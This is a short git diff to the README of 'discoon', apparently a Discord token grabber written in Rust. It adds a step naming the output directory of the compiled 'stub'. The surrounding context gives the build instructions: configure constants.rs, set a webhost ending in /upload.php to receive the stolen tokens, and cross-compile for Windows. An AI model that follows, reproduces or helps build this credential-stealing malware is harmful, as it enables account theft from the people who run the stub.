@@ -40,6 +40,7 @@ This is a lot faster than other grabbers due to not using regex to find tokens a
 4. Configure the options in [constants.rs](https://github.com/RadonCoding/discoon/blob/main/src/constants.rs) however you like
 5. Make sure your [webhost](https://github.com/RadonCoding/discoon/blob/main/src/constants.rs#L47) has `/upload.php` at the end
 5. Run `cargo build --release --target=x86_64-pc-windows-msvc`
+6. The stub will be in `/target/x86_64-pc-windows-msvc/release`
 
 ### Contributing
 1. Fork it
